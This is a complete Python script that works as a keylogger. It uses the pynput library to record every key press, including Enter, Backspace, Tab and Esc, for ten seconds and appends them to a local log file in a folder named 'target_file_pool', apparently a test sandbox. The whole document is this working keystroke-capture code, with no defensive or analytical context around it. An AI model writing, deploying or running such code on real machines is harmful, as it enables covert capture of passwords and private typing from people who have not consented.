from pynput.keyboard import Key, Listener
import time

# Path to the log file
log_file = "../target_file_pool/keylog.txt"

# Function to write keystrokes to the log file
def write_to_file(key):
    try:
        # Convert key to string and remove single quotes
        key_data = str(key).replace("'", "")

        # Handle special keys
        if key == Key.space:
            key_data = ' '
        elif key == Key.enter:
            key_data = '\n'
        elif key == Key.backspace:
            key_data = '[BACKSPACE]'
        elif key == Key.tab:
            key_data = '\t'
        elif key == Key.esc:
            key_data = '[ESC]'
        else:
            # Handle other special keys (e.g., shift, ctrl, etc.)
            key_data = key_data if len(key_data) > 1 else key_data

        # Write the key data to the file
        with open(log_file, "a") as f:
            f.write(key_data)
            f.flush()  # Ensure the key data is written immediately

    except Exception as e:
        print(f"Error: {e}")

# Duration for which the keylogger should run (in seconds)
duration = 10  # Example: Run for 10 seconds

# Record the start time
start_time = time.time()

# Function to stop the listener after the specified duration
def stop_listener():
    if time.time() - start_time > duration:
        return False

# Set up the listener
listener = Listener(on_press=write_to_file)

# Start the listener
listener.start()

# Run the listener for the specified duration
while time.time() - start_time < duration:
    time.sleep(0.1)  # Wait a little before checking the time again

# Stop the listener
listener.stop()

print("Keylogger stopped after running for", duration, "seconds.")
